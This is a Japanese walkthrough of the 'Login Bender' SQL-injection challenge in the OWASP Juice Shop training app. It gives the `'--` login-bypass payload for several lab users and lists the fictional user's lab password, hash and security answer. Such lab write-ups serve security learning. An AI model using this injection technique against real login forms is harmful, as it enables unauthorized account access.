# Login Bender ✅

**難易度:** ⭐⭐⭐
**カテゴリ:** SQLi
**目標:** Benderとしてログインする

---

## 実行手順

1. `http://localhost:3000/#/login` にアクセス
2. Email欄に入力:
   ```
   bender@juice-sh.op'--
   ```
3. Password欄に何か入力（例: `a`）
4. Login をクリック → Bender としてログイン成功

## Bender の認証情報

```
メール: bender@juice-sh.op
パスワード: OhG0dPlease1LubYou
パスワードハッシュ: 0c36e517e3fa95aabf1bbffc6744a4ef
セキュリティ質問: Company you first worked for as an adult?
セキュリティ回答: Stop'n'Drop
```

- Bender = Futurama のキャラクター
- Stop'n'Drop = 作中に登場する会社

## 解説

Login Jim と同じテクニック:
- メールアドレスの後に `'--` を付けてSQLを改ざん
- パスワードチェックをバイパス

| ユーザー | ペイロード |
|---------|-----------|
| Jim | `jim@juice-sh.op'--` |
| Bender | `bender@juice-sh.op'--` |
| Admin | `admin@juice-sh.op'--` |
| 誰でも | `メールアドレス'--` |

## 関連チャレンジ

- [Login Jim](login-jim.md)
- [Login Admin](../difficulty-2/login-admin.md)
- [Reset Bender's Password](../difficulty-4/reset-benders-password.md)
